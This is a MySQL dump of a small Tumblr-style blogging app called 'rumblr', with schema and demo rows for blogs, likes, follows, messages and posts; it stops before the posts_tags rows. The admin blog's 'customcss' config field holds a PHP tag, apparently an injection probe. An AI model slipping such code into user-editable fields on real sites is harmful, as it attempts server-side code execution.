-- MySQL dump 10.13  Distrib 5.5.37, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: rumblr
-- ------------------------------------------------------
-- Server version	5.5.37-0ubuntu0.14.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `blogs`
--

DROP TABLE IF EXISTS `blogs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `blogs` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `config` text COLLATE utf8_unicode_ci NOT NULL,
  `domain` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `blogs_user_id_foreign` (`user_id`),
  CONSTRAINT `blogs_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blogs`
--

LOCK TABLES `blogs` WRITE;
/*!40000 ALTER TABLE `blogs` DISABLE KEYS */;
INSERT INTO `blogs` VALUES (1,1,'admin','{\"title\":\"Admin Tumbelog\",\"picture\":\"uploads\\/pictures\\/580982786333084419_5564db5a95d9.jpg\",\"description\":\"Tumbelog ~ admin.\",\"customcss\":\"<?php echo \'mert\'; ?>\"}','','2014-05-15 03:08:26','2014-05-18 07:03:40'),(2,2,'somus','{\"title\":\"Untitled\",\"picture\":\"assets\\/images\\/default_avatar.png\",\"description\":\"\",\"customcss\":\"\"}','','2014-05-15 04:23:40','2014-05-15 04:23:40'),(3,3,'icupbaby','{\"title\":\"Untitled\",\"picture\":\"assets\\/images\\/default_avatar.png\",\"description\":\"\",\"customcss\":\"\"}','','2014-05-15 04:39:31','2014-05-15 04:39:31'),(4,3,'22222','{\"title\":\"Healthy Search\",\"picture\":\"assets\\/images\\/default_avatar.png\",\"description\":\"\",\"customcss\":\"\"}','','2014-05-15 04:41:06','2014-05-15 04:41:06'),(5,4,'John','{\"title\":\"Bikini World\",\"picture\":\"uploads\\/pictures\\/x200 (2).jpg\",\"description\":\"Buy Bikini from bikini world\",\"customcss\":\"\"}','','2014-05-15 04:48:57','2014-05-15 04:50:12'),(6,5,'Mike','{\"title\":\"Shoes corner\",\"picture\":\"uploads\\/pictures\\/x200 (1).jpg\",\"description\":\"Worldly shoes \",\"customcss\":\"\"}','','2014-05-15 04:55:02','2014-05-15 04:57:41'),(7,6,'Bill','{\"title\":\"Fun for life\",\"picture\":\"uploads\\/pictures\\/x200.jpg\",\"description\":\"fun for life .. blog by Bill.\",\"customcss\":\"\"}','','2014-05-15 05:04:55','2014-05-15 05:06:38'),(8,7,'sriraman','{\"title\":\"Untitled\",\"picture\":\"assets\\/images\\/default_avatar.png\",\"description\":\"\",\"customcss\":\"\"}','','2014-05-15 05:31:14','2014-05-15 08:18:38'),(9,8,'','{\"title\":\"Untitled\",\"picture\":\"assets\\/images\\/default_avatar.png\",\"description\":\"\",\"customcss\":\"\"}','','2014-05-15 05:49:29','2014-05-15 05:49:29'),(10,1,'makeup','{\"title\":\"Makeup blog\",\"picture\":\"uploads\\/pictures\\/x200 (3).jpg\",\"description\":\"\",\"customcss\":\"\"}','','2014-05-15 06:10:20','2014-05-15 06:11:09'),(11,9,'payxoo','{\"title\":\"Payxoo\",\"picture\":\"uploads\\/pictures\\/logo1.png\",\"description\":\"Love this script!\",\"customcss\":\"\"}','','2014-05-16 03:22:17','2014-05-16 03:28:15'),(12,1,'testrom','{\"title\":\"TEST\",\"picture\":\"assets\\/images\\/default_avatar.png\",\"description\":\"\",\"customcss\":\"\"}','','2014-05-18 02:09:15','2014-05-18 02:09:15'),(13,1,'gay','{\"title\":\"Gay guys\",\"picture\":\"assets\\/images\\/default_avatar.png\",\"description\":\"\",\"customcss\":\"\"}','','2014-05-18 04:43:04','2014-05-18 04:43:04'),(14,10,'rumblr12','{\"title\":\"Untitled\",\"picture\":\"assets\\/images\\/default_avatar.png\",\"description\":\"\",\"customcss\":\"\"}','','2014-05-18 06:39:41','2014-05-18 06:39:41'),(15,11,'test','{\"title\":\"Untitled\",\"picture\":\"assets\\/images\\/default_avatar.png\",\"description\":\"\",\"customcss\":\"\"}','','2014-05-18 07:40:50','2014-05-18 07:40:50');
/*!40000 ALTER TABLE `blogs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `follows`
--

DROP TABLE IF EXISTS `follows`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `follows` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `blog_id` int(10) unsigned NOT NULL,
  `user_id` int(10) unsigned NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `follows_blog_id_foreign` (`blog_id`),
  KEY `follows_user_id_foreign` (`user_id`),
  CONSTRAINT `follows_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`),
  CONSTRAINT `follows_blog_id_foreign` FOREIGN KEY (`blog_id`) REFERENCES `blogs` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `follows`
--

LOCK TABLES `follows` WRITE;
/*!40000 ALTER TABLE `follows` DISABLE KEYS */;
INSERT INTO `follows` VALUES (1,1,4,'2014-05-15 04:52:20','2014-05-15 04:52:20'),(2,5,1,'2014-05-15 04:52:41','2014-05-15 04:52:41'),(3,1,1,'2014-05-15 05:03:16','2014-05-15 05:03:16'),(4,6,1,'2014-05-15 05:03:34','2014-05-15 05:03:34'),(5,1,5,'2014-05-15 05:03:42','2014-05-15 05:03:42'),(7,1,6,'2014-05-15 05:42:51','2014-05-15 05:42:51'),(9,11,1,'2014-05-18 03:01:37','2014-05-18 03:01:37'),(10,10,1,'2014-05-18 03:59:56','2014-05-18 03:59:56'),(11,7,1,'2014-05-18 05:55:28','2014-05-18 05:55:28'),(12,7,1,'2014-05-18 05:55:28','2014-05-18 05:55:28');
/*!40000 ALTER TABLE `follows` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `groups`
--

DROP TABLE IF EXISTS `groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `groups` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `permissions` text COLLATE utf8_unicode_ci,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `groups_name_unique` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `groups`
--

LOCK TABLES `groups` WRITE;
/*!40000 ALTER TABLE `groups` DISABLE KEYS */;
INSERT INTO `groups` VALUES (1,'Users','{\"users\":1}','2014-05-15 03:07:52','2014-05-15 03:07:52'),(2,'Admins','{\"admin\":1,\"users\":1}','2014-05-15 03:07:52','2014-05-15 03:07:52');
/*!40000 ALTER TABLE `groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `likes`
--

DROP TABLE IF EXISTS `likes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `likes` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` int(10) unsigned NOT NULL,
  `user_id` int(10) unsigned NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `likes_post_id_foreign` (`post_id`),
  KEY `likes_user_id_foreign` (`user_id`),
  CONSTRAINT `likes_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`),
  CONSTRAINT `likes_post_id_foreign` FOREIGN KEY (`post_id`) REFERENCES `posts` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=66 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `likes`
--

LOCK TABLES `likes` WRITE;
/*!40000 ALTER TABLE `likes` DISABLE KEYS */;
INSERT INTO `likes` VALUES (1,4,3,'2014-05-15 04:40:41','2014-05-15 04:40:41'),(2,18,1,'2014-05-15 04:52:48','2014-05-15 04:52:48'),(3,17,1,'2014-05-15 04:52:51','2014-05-15 04:52:51'),(4,16,1,'2014-05-15 04:52:55','2014-05-15 04:52:55'),(5,15,1,'2014-05-15 04:52:58','2014-05-15 04:52:58'),(6,18,1,'2014-05-15 04:53:48','2014-05-15 04:53:48'),(7,10,4,'2014-05-15 04:54:17','2014-05-15 04:54:17'),(8,20,5,'2014-05-15 05:03:44','2014-05-15 05:03:44'),(9,19,5,'2014-05-15 05:03:45','2014-05-15 05:03:45'),(10,13,5,'2014-05-15 05:03:47','2014-05-15 05:03:47'),(11,10,5,'2014-05-15 05:03:50','2014-05-15 05:03:50'),(12,9,5,'2014-05-15 05:03:51','2014-05-15 05:03:51'),(13,1,5,'2014-05-15 05:03:53','2014-05-15 05:03:53'),(14,25,1,'2014-05-15 05:03:56','2014-05-15 05:03:56'),(15,24,1,'2014-05-15 05:03:57','2014-05-15 05:03:57'),(16,23,1,'2014-05-15 05:03:59','2014-05-15 05:03:59'),(17,22,1,'2014-05-15 05:04:06','2014-05-15 05:04:06'),(18,20,1,'2014-05-15 05:04:12','2014-05-15 05:04:12'),(19,26,5,'2014-05-15 05:04:21','2014-05-15 05:04:21'),(20,25,5,'2014-05-15 05:04:22','2014-05-15 05:04:22'),(21,24,5,'2014-05-15 05:04:24','2014-05-15 05:04:24'),(22,23,5,'2014-05-15 05:04:25','2014-05-15 05:04:25'),(23,39,1,'2014-05-15 06:09:48','2014-05-15 06:09:48'),(24,38,1,'2014-05-15 06:09:51','2014-05-15 06:09:51'),(25,41,1,'2014-05-15 06:19:05','2014-05-15 06:19:05'),(26,40,1,'2014-05-15 06:19:08','2014-05-15 06:19:08'),(27,33,1,'2014-05-15 06:19:16','2014-05-15 06:19:16'),(28,32,1,'2014-05-15 06:19:18','2014-05-15 06:19:18'),(29,35,1,'2014-05-15 06:19:31','2014-05-15 06:19:31'),(31,26,1,'2014-05-15 06:19:37','2014-05-15 06:19:37'),(36,48,1,'2014-05-15 07:44:45','2014-05-15 07:44:45'),(37,50,6,'2014-05-15 07:59:27','2014-05-15 07:59:27'),(38,47,1,'2014-05-15 08:21:52','2014-05-15 08:21:52'),(39,46,1,'2014-05-15 08:21:54','2014-05-15 08:21:54'),(40,45,1,'2014-05-15 08:21:56','2014-05-15 08:21:56'),(41,44,1,'2014-05-15 08:21:59','2014-05-15 08:21:59'),(42,51,1,'2014-05-15 23:45:50','2014-05-15 23:45:50'),(43,50,1,'2014-05-15 23:45:51','2014-05-15 23:45:51'),(46,52,1,'2014-05-16 03:38:59','2014-05-16 03:38:59'),(47,61,1,'2014-05-18 00:04:37','2014-05-18 00:04:37'),(48,60,1,'2014-05-18 00:04:37','2014-05-18 00:04:37'),(49,59,1,'2014-05-18 00:04:38','2014-05-18 00:04:38'),(51,64,1,'2014-05-18 01:53:52','2014-05-18 01:53:52'),(53,62,1,'2014-05-18 01:53:55','2014-05-18 01:53:55'),(54,67,1,'2014-05-18 02:08:43','2014-05-18 02:08:43'),(55,70,1,'2014-05-18 02:56:55','2014-05-18 02:56:55'),(57,53,1,'2014-05-18 03:01:34','2014-05-18 03:01:34'),(58,69,1,'2014-05-18 03:19:08','2014-05-18 03:19:08'),(60,34,1,'2014-05-18 05:26:24','2014-05-18 05:26:24'),(61,79,1,'2014-05-18 06:59:07','2014-05-18 06:59:07'),(65,81,1,'2014-05-18 07:15:19','2014-05-18 07:15:19');
/*!40000 ALTER TABLE `likes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `messages`
--

DROP TABLE IF EXISTS `messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `messages` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `sender_id` int(10) unsigned NOT NULL,
  `receiver_id` int(10) unsigned NOT NULL,
  `message` text COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `messages_sender_id_foreign` (`sender_id`),
  KEY `messages_receiver_id_foreign` (`receiver_id`),
  CONSTRAINT `messages_receiver_id_foreign` FOREIGN KEY (`receiver_id`) REFERENCES `blogs` (`id`),
  CONSTRAINT `messages_sender_id_foreign` FOREIGN KEY (`sender_id`) REFERENCES `blogs` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `messages`
--

LOCK TABLES `messages` WRITE;
/*!40000 ALTER TABLE `messages` DISABLE KEYS */;
INSERT INTO `messages` VALUES (1,7,1,'hello admin. you got a nice blog','2014-05-15 05:43:01','2014-05-15 05:43:01'),(2,6,1,'Your blog post on Justin Bieber is unprofessional','2014-05-15 05:43:43','2014-05-15 05:43:43'),(3,5,1,'This is john from Bikini world.','2014-05-15 05:44:14','2014-05-15 05:44:14'),(4,1,1,'You are really missing templates... specially Archives view.','2014-05-18 06:04:01','2014-05-18 06:04:01'),(5,1,1,'so you can ban..but can\'t unban?','2014-05-18 06:05:01','2014-05-18 06:05:01');
/*!40000 ALTER TABLE `messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `migrations`
--

DROP TABLE IF EXISTS `migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `migrations` (
  `migration` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `migrations`
--

LOCK TABLES `migrations` WRITE;
/*!40000 ALTER TABLE `migrations` DISABLE KEYS */;
INSERT INTO `migrations` VALUES ('2012_12_06_225921_migration_cartalyst_sentry_install_users',1),('2012_12_06_225929_migration_cartalyst_sentry_install_groups',1),('2012_12_06_225945_migration_cartalyst_sentry_install_users_groups_pivot',1),('2012_12_06_225988_migration_cartalyst_sentry_install_throttle',1),('2014_04_15_115839_create_blogs_table',1),('2014_04_15_120600_create_posts_table',1),('2014_04_15_120923_create_tags_table',1),('2014_04_15_121026_create_regular_posts_table',1),('2014_04_15_122015_create_posts_tags_table',1),('2014_04_15_122307_create_pages_table',1),('2014_04_15_122520_create_likes_table',1),('2014_04_15_122740_create_follows_table',1),('2014_04_18_014521_add_username_field_to_users_table',1),('2014_04_22_130755_create_reblogged_posts_table',1),('2014_04_23_072224_create_messages_table',1),('2014_05_15_073948_settings',1);
/*!40000 ALTER TABLE `migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `pages`
--

DROP TABLE IF EXISTS `pages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `pages` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `blog_id` int(10) unsigned NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `pages_blog_id_foreign` (`blog_id`),
  CONSTRAINT `pages_blog_id_foreign` FOREIGN KEY (`blog_id`) REFERENCES `blogs` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `pages`
--

LOCK TABLES `pages` WRITE;
/*!40000 ALTER TABLE `pages` DISABLE KEYS */;
/*!40000 ALTER TABLE `pages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `posts`
--

DROP TABLE IF EXISTS `posts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `posts` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `type` enum('regular','reblogged') COLLATE utf8_unicode_ci NOT NULL,
  `search_index` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `blog_id` int(10) unsigned NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `posts_blog_id_foreign` (`blog_id`),
  CONSTRAINT `posts_blog_id_foreign` FOREIGN KEY (`blog_id`) REFERENCES `blogs` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=84 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `posts`
--

LOCK TABLES `posts` WRITE;
/*!40000 ALTER TABLE `posts` DISABLE KEYS */;
INSERT INTO `posts` VALUES (1,'regular','Poem-poem, lines, quotes',1,'2014-05-15 04:39:53','2014-05-15 04:39:53',NULL),(2,'regular','dfsdf-sdfsf',3,'2014-05-15 04:39:56','2014-05-15 04:41:46','2014-05-15 04:41:46'),(3,'regular','#hugs #kiss',1,'2014-05-15 04:40:21','2014-05-15 04:41:40','2014-05-15 04:41:40'),(4,'regular','dddd - ',3,'2014-05-15 04:40:25','2014-05-15 04:41:35','2014-05-15 04:41:35'),(5,'regular','ada-hello',1,'2014-05-15 04:41:01','2014-05-15 04:41:43','2014-05-15 04:41:43'),(6,'regular','edgdsgb-a,b',2,'2014-05-15 04:42:11','2014-05-15 04:42:54','2014-05-15 04:42:54'),(7,'regular','asdas-hello poem',1,'2014-05-15 04:42:18','2014-05-15 04:42:23','2014-05-15 04:42:23'),(8,'regular','awsda-tag, asa',1,'2014-05-15 04:42:43','2014-05-15 04:42:53','2014-05-15 04:42:53'),(9,'regular','kiss, love, hugs',1,'2014-05-15 04:43:14','2014-05-15 04:43:14',NULL),(10,'regular','quotes, life, love, world, peace',1,'2014-05-15 04:44:32','2014-05-15 04:44:32',NULL),(11,'regular',' - ',1,'2014-05-15 04:44:41','2014-05-15 04:44:45','2014-05-15 04:44:45'),(12,'regular','Tales of Escapees Add to Worries About Nigerian Girls - girls nigeria',1,'2014-05-15 04:45:44','2014-05-15 04:45:58','2014-05-15 04:45:58'),(13,'regular','Tales of Escapees Add to Worries About Nigerian Girls - girls, nigeria',1,'2014-05-15 04:46:26','2014-05-15 04:46:26',NULL),(14,'regular','#red #girls',5,'2014-05-15 04:50:32','2014-05-15 04:50:58','2014-05-15 04:50:58'),(15,'regular','girls, bikini',5,'2014-05-15 04:51:09','2014-05-15 04:51:09',NULL),(16,'regular','girls, bikini, undie',5,'2014-05-15 04:51:26','2014-05-15 04:51:26',NULL),(17,'regular','bra, love, life',5,'2014-05-15 04:51:45','2014-05-15 04:51:45',NULL),(18,'regular','sex, love, life',5,'2014-05-15 04:52:08','2014-05-15 04:52:08',NULL),(19,'reblogged','sex, love, life',1,'2014-05-15 04:53:55','2014-05-15 04:53:55',NULL),(20,'reblogged','girls, bikini, undie',1,'2014-05-15 04:54:05','2014-05-15 04:54:05',NULL),(21,'reblogged','quotes, life, love, world, peace',5,'2014-05-15 04:54:19','2014-05-15 04:54:19',NULL),(22,'reblogged','kiss, love, hugs',5,'2014-05-15 04:54:25','2014-05-15 04:54:25',NULL),(23,'regular','shoes, red, nike',6,'2014-05-15 04:58:01','2014-05-15 04:58:01',NULL),(24,'regular','adidas, shoe, running',6,'2014-05-15 04:58:47','2014-05-15 04:58:47',NULL),(25,'regular','nike, do it right, ',6,'2014-05-15 04:58:59','2014-05-15 04:58:59',NULL),(26,'reblogged','kiss, love, hugs',1,'2014-05-15 05:04:09','2014-05-15 05:04:09',NULL),(27,'regular','dgdsg-a,b, ',2,'2014-05-15 05:05:08','2014-05-15 05:11:23','2014-05-15 05:11:23'),(28,'regular','dsfsdg-b, a,',2,'2014-05-15 05:06:46','2014-05-15 05:11:21','2014-05-15 05:11:21'),(29,'regular','dgrhdtjgj-sf, f, ',2,'2014-05-15 05:10:29','2014-05-15 05:11:20','2014-05-15 05:11:20'),(30,'regular','aaaaa-aa, aa',2,'2014-05-15 05:11:06','2014-05-15 05:11:18','2014-05-15 05:11:18'),(31,'regular','Funny text-chat, hello, world',7,'2014-05-15 05:14:22','2014-05-15 05:14:22',NULL),(32,'regular','sex, love, life',7,'2014-05-15 05:14:39','2014-05-15 05:14:39',NULL),(33,'regular','shoe, life, colors',7,'2014-05-15 05:15:06','2014-05-15 05:15:06',NULL),(34,'regular','chat, world, text',7,'2014-05-15 05:15:29','2014-05-15 05:15:29',NULL),(35,'regular','world',7,'2014-05-15 05:15:46','2014-05-15 05:15:46',NULL),(36,'regular','dummy',8,'2014-05-15 05:34:13','2014-05-15 05:34:13',NULL),(37,'regular','dfsdfsdf-',3,'2014-05-15 05:58:29','2014-05-15 06:09:54','2014-05-15 06:09:54'),(38,'regular','love, life, black',1,'2014-05-15 06:09:19','2014-05-15 06:09:19',NULL),(39,'regular','girls, fun, love, sex, life',1,'2014-05-15 06:09:43','2014-05-15 06:09:43',NULL),(40,'regular','wear, bra',10,'2014-05-15 06:10:39','2014-05-15 06:10:39',NULL),(41,'regular','#love',10,'2014-05-15 06:11:27','2014-05-15 06:11:27',NULL),(42,'reblogged','sex, love, life',1,'2014-05-15 06:19:13','2014-05-15 06:19:13',NULL),(43,'reblogged','shoe, life, colors',1,'2014-05-15 06:19:26','2014-05-15 06:19:26',NULL),(44,'regular','obama',8,'2014-05-15 06:42:57','2014-05-15 06:42:57',NULL),(45,'regular','priyanka',8,'2014-05-15 06:50:59','2014-05-15 06:50:59',NULL),(46,'regular','',1,'2014-05-15 07:10:49','2014-05-15 07:10:49',NULL),(47,'regular','',1,'2014-05-15 07:11:57','2014-05-15 07:11:57',NULL),(48,'regular','bodypaintedjeans,thongs',8,'2014-05-15 07:28:18','2014-05-15 07:28:18',NULL),(49,'reblogged','bodypaintedjeans,thongs',1,'2014-05-15 07:44:48','2014-05-15 07:54:08','2014-05-15 07:54:08'),(50,'regular','',7,'2014-05-15 07:59:18','2014-05-15 07:59:18',NULL),(51,'reblogged','bodypaintedjeans,thongs',1,'2014-05-15 08:08:01','2014-05-15 08:08:01',NULL),(52,'regular','Testing-love',11,'2014-05-16 03:23:28','2014-05-16 03:23:28',NULL),(53,'regular','#beach',11,'2014-05-16 03:24:45','2014-05-16 03:24:45',NULL),(54,'regular','good ',11,'2014-05-16 03:25:17','2014-05-16 03:25:17',NULL),(55,'regular','Arts &amp; Entertainment News-arts',11,'2014-05-16 03:31:02','2014-05-16 03:35:53','2014-05-16 03:35:53'),(56,'reblogged','Testing-love',1,'2014-05-16 03:38:46','2014-05-16 03:38:46',NULL),(57,'reblogged','good ',1,'2014-05-16 03:38:52','2014-05-16 03:38:52',NULL),(58,'reblogged','',1,'2014-05-17 23:58:08','2014-05-17 23:58:08',NULL),(59,'regular','',1,'2014-05-17 23:59:22','2014-05-17 23:59:22',NULL),(60,'regular','',1,'2014-05-18 00:01:25','2014-05-18 00:01:25',NULL),(61,'regular','not bad-',1,'2014-05-18 00:02:40','2014-05-18 00:02:40',NULL),(62,'regular','Yellow Pages | Business Directory | Local Business-Yellow Pages script',1,'2014-05-18 00:22:05','2014-05-18 00:22:05',NULL),(63,'regular','NICE-',10,'2014-05-18 01:53:34','2014-05-18 01:53:34',NULL),(64,'reblogged','NICE-',1,'2014-05-18 01:53:45','2014-05-18 01:53:45',NULL),(65,'regular','',10,'2014-05-18 01:54:47','2014-05-18 01:54:47',NULL),(66,'regular','dssdSD-QSDQSDSQD',1,'2014-05-18 02:07:31','2014-05-18 03:57:32','2014-05-18 03:57:32'),(67,'reblogged','',1,'2014-05-18 02:08:39','2014-05-18 02:08:39',NULL),(68,'regular','defqSDFQD-qsdfQSDF',12,'2014-05-18 02:09:28','2014-05-18 02:09:28',NULL),(69,'regular','edfzeFZE',1,'2014-05-18 02:09:45','2014-05-18 02:09:45',NULL),(70,'regular','SD&lt;FSDF - SQDFSD',1,'2014-05-18 02:10:06','2014-05-18 02:10:06',NULL),(71,'reblogged','SD&lt;FSDF - SQDFSD',1,'2014-05-18 02:57:08','2014-05-18 02:57:16','2014-05-18 02:57:16'),(72,'regular','-happy',11,'2014-05-18 04:19:08','2014-05-18 04:51:19','2014-05-18 04:51:19'),(73,'regular','',1,'2014-05-18 04:54:40','2014-05-18 04:55:21','2014-05-18 04:55:21'),(74,'regular','',1,'2014-05-18 04:56:33','2014-05-18 04:57:38','2014-05-18 04:57:38'),(75,'regular','News Story-',1,'2014-05-18 05:27:32','2014-05-18 05:27:45','2014-05-18 05:27:45'),(76,'regular','yo-',1,'2014-05-18 05:57:15','2014-05-18 05:57:40','2014-05-18 05:57:40'),(77,'reblogged','yo-',1,'2014-05-18 05:57:25','2014-05-18 05:57:38','2014-05-18 05:57:38'),(78,'reblogged','yo-',1,'2014-05-18 05:57:32','2014-05-18 05:57:36','2014-05-18 05:57:36'),(79,'reblogged','edfzeFZE',1,'2014-05-18 06:02:10','2014-05-18 06:02:10',NULL),(80,'regular','Chat for gay guys-Chat-for-gay-guys,Gays-sister-brother',13,'2014-05-18 06:37:33','2014-05-18 06:37:33',NULL),(81,'reblogged','Chat for gay guys-Chat-for-gay-guys,Gays-sister-brother',14,'2014-05-18 06:42:24','2014-05-18 06:42:24',NULL),(82,'regular','dasdasd-test good',1,'2014-05-18 07:13:52','2014-05-18 07:13:52',NULL),(83,'regular','123-test good',1,'2014-05-18 07:15:41','2014-05-18 07:15:41',NULL);
/*!40000 ALTER TABLE `posts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `posts_tags`
--

DROP TABLE IF EXISTS `posts_tags`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `posts_tags` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` int(10) unsigned NOT NULL,
  `tag_id` int(10) unsigned NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `posts_tags_post_id_foreign` (`post_id`),
  KEY `posts_tags_tag_id_foreign` (`tag_id`),
  CONSTRAINT `posts_tags_tag_id_foreign` FOREIGN KEY (`tag_id`) REFERENCES `tags` (`id`),
  CONSTRAINT `posts_tags_post_id_foreign` FOREIGN KEY (`post_id`) REFERENCES `posts` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=139 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `posts_tags`
--

LOCK TABLES `posts_tags` WRITE;
/*!40000 ALTER TABLE `posts_tags` DISABLE KEYS */;
